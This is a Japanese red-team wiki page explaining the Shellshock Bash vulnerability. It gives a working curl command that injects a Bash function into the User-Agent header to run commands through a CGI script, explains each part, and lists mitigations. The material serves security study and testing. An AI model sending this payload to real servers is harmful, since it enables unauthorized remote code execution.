---
title: Shell Shock
parent: Attack Repository
grand_parent: Red Team
nav_order: 10
---

# シェルショック
シェルショック（Shellshock）脆弱性は、特にWebサーバーがBashを使用している場合、ブラウザ経由で悪用される可能性がありました。具体的には、WebサーバーがCGIスクリプト（Common Gateway Interface）を使ってBashを呼び出す場合、HTTPリクエストの特定のヘッダーに悪意のあるコードを仕込むことで、リモートコード実行（RCE）が可能になります。

#### 概要
ブラウザからHTTPリクエストを送信する際に、リクエストヘッダーに悪意のある環境変数を設定し、脆弱なサーバーがそのヘッダーを処理することで、任意のコードがサーバー上で実行されるという手法です。

#### 実行方法の例
以下は、`curl`コマンドを使ってシェルショック脆弱性を悪用する例です。`User-Agent`ヘッダーに悪意のあるコードを注入し、それをCGIスクリプトが処理すると、サーバー上でコードが実行されます。

```bash
curl -A '() { :; }; echo; /bin/bash -c "echo Vulnerable; /bin/uname -a"' http://example.com/cgi-bin/vulnerable-script
```

#### 各部分の説明

- `curl -A '() { :; }; echo; /bin/bash -c "echo Vulnerable; /bin/uname -a"'`: `User-Agent`ヘッダーに悪意のあるBash関数を含むコードを送信します。
- `http://example.com/cgi-bin/vulnerable-script`: シェルショックに脆弱なCGIスクリプトが配置されているURLを指定します。
- `/bin/bash -c "echo Vulnerable; /bin/uname -a"`: `uname -a`コマンドを実行し、システム情報を表示するようにしています。

#### 実行結果

- 脆弱なサーバーの場合、サーバーが`Vulnerable`というメッセージとシステム情報を返します。
- 修正済みのサーバーの場合、ヘッダーがそのまま無視され、通常のレスポンスが返されます。

#### ブラウザ経由での実行
直接ブラウザを使ってこの攻撃を仕掛けることはできませんが、`curl`や`wget`などのコマンドラインツールや、専用のHTTPリクエスト作成ツールを使って実行できます。ブラウザの拡張機能を使ってカスタムHTTPリクエストを作成することも可能です。

#### 対策
- **Bashのアップデート**: 脆弱なバージョンのBashを使っているシステムを最新バージョンにアップデートします。
- **CGIスクリプトの見直し**: 特にインターネットに公開されているサーバーで、Bashに依存しているCGIスクリプトの利用を避けるか、脆弱性のないシェルを使用します。